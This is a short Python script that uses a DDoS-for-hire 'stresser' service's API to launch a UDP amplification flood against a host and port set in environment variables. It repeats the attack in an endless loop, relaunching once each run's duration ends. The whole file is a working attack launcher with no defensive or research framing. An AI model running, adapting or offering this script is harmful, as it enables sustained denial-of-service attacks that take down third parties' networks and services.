import time
import os
import requests
from dotenv import load_dotenv

load_dotenv()

apiKey = os.getenv("API_KEY")
apiPath = "https://stresser.ai/api/api.php"
host = os.getenv("HOST")
port = "80"
duration = int(os.getenv("DURATION"))
method = "UDP-AMP"


def hitRequest():
    r = requests.get(f"{apiPath}?key={apiKey}&action=layer4&host={host}&port={port}&time={duration}&method={method}")
    print(r.text)


while True:
    hitRequest()
    time.sleep(duration + 5)
